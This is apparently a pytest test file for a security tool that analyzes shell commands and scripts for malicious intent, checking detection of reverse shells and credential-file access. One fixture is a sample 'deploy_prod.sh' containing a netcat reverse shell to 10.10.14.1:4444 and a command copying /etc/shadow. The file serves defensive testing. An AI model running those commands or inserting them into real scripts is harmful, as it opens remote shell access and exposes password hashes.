import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.core.pipeline.script_tool import ScriptIntentAnalyzerTool


def test_script_regex_detection():
    tool = ScriptIntentAnalyzerTool()
    
    assert tool.detect_script_reference("bash deploy.sh") == "deploy.sh"
    assert tool.detect_script_reference("./install.sh --flag") == "install.sh"
    assert tool.detect_script_reference("sh /opt/scripts/runner.sh") == "runner.sh"
    assert tool.detect_script_reference("chmod +x setup.sh && ./setup.sh") == "setup.sh"
    assert tool.detect_script_reference("python test.py") == "test.py"
    assert tool.detect_script_reference("ls -la /tmp") is None


@pytest.mark.asyncio
async def test_analyze_script_referenced_without_content():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post(
            "/api/analyze",
            json={"command": "bash malicious_script.sh"}
        )
        assert response.status_code == 200
        data = response.json()
        assert "script_analysis" in data
        sa = data["script_analysis"]
        assert sa is not None
        assert sa["script_detected_in_command"] is True
        assert sa["script_content_provided"] is False
        assert sa["script_name"] == "malicious_script.sh"


@pytest.mark.asyncio
async def test_analyze_with_malicious_script_payload():
    malicious_script = """#!/bin/bash
echo "Starting deployment..."
nc 10.10.14.1 4444 -e /bin/bash &
cat /etc/shadow > /tmp/shadow_creds.txt
"""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post(
            "/api/analyze",
            json={
                "command": "bash deploy_prod.sh",
                "script_content": malicious_script,
                "script_name": "deploy_prod.sh"
            }
        )
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] == "CRITICAL"
        assert data["is_reversible"] is False
        
        sa = data.get("script_analysis")
        assert sa is not None
        assert sa["is_malicious"] is True
        assert sa["severity"] == "CRITICAL"
        assert len(sa["detected_signatures"]) > 0
        assert any("Reverse Shell" in sig or "Shadow" in sig for sig in sa["detected_signatures"])
        assert any("10.10.14.1" in conn for conn in sa["network_connections"])
        assert any("/etc/shadow" in f for f in sa["accessed_files"])


@pytest.mark.asyncio
async def test_analyze_with_benign_script_payload():
    benign_script = """#!/bin/bash
echo "Building project bundle..."
mkdir -p ./build
date > ./build/timestamp.txt
tar -czf ./build/bundle.tar.gz ./build/timestamp.txt
echo "Build finished."
"""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post(
            "/api/analyze",
            json={
                "command": "./build_bundle.sh",
                "script_content": benign_script,
                "script_name": "build_bundle.sh"
            }
        )
        assert response.status_code == 200
        data = response.json()
        sa = data.get("script_analysis")
        assert sa is not None
        assert sa["is_malicious"] is False
        assert sa["severity"] == "SAFE"
